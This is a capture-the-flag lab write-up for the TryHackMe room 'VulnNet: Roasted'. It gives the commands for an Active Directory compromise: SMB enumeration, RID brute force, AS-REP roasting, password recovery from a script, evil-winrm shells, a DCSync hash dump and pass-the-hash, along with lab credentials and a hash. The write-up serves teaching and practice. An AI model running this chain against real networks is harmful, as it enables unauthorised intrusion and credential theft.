# VulnNet: Roasted

<figure><img src="../.gitbook/assets/image (901).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://tryhackme.com/room/vulnnetroasted" %}

***

First , Let's use The `nmap` scan  to check the which services is running  .

```
sudo nmap -sV -sC -Pn 10.48.133.159 -T4
```

<figure><img src="../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>

We can see on the above image we got the smb port open `139,445` let's List The SMB services .

```
smbclient -L //10.48.133.159/ -N
```

<figure><img src="../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>

Then check the content on the inside the services !

```
smbclient //10.48.133.159/VulnNet-Business-Anonymous -N
```

<figure><img src="../.gitbook/assets/image (904).png" alt=""><figcaption></figcaption></figure>

Same For The Second Share .

```
smbclient //10.48.133.159/VulnNet-Enterprise-Anonymous -N
```

<figure><img src="../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>

Then Collect the all names from the all files .

<figure><img src="../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>

Then we use the Username Enumeration tools to make the all types of possible usernames .

{% embed url="https://github.com/urbanadventurer/username-anarchy.git" %}

```
username-anarchy --input-file users.txt > usernames.txt
```

Check for the all rid values and also paste these username inside the `usernames.txt` file !

```
nxc smb 10.48.181.145 -u 'guest' -p '' --rid-brute
```

<figure><img src="../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>

Then i use the kerbrute tool for the validate the usernames and we got the hash that means Kerberos pre-authentication is disabled and we can attack the AS-REP Roasting !

```
kerbrute userenum -d vulnnet-rst.local --dc 10.48.181.145 usernames.txt
```

<figure><img src="../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>

AS-REP Roasting attacking for the `usernames.txt` file  !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile usernames.txt -dc-ip 10.48.181.145
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

Let,s Crack The Hash !

<figure><img src="../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>

Use The credential of t-skid and list the services !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
smbclient -U t-skid //10.48.134.46/NETLOGON
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>

Check The Password in The `ResetPassword.vbs` !

<figure><img src="../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>

Then we Check The Credential and we got the `Pwn3d!` its mean this account is a local admin account  !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
crackmapexec smb 10.48.134.46 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>

Then we use the evil-winrm to get the shell !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
evil-winrm -i 10.48.145.35 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>

Then we use the local admin credential to perform the DCSync attack / Active Directory credential dumping !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-secretsdump vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.48.134.46 -just-dc-user Administrator
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (911).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
evil-winrm -i 10.48.134.46 -u 'Administrator' -H c2597747aa5e43022a3a3049a3c3b09d
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>
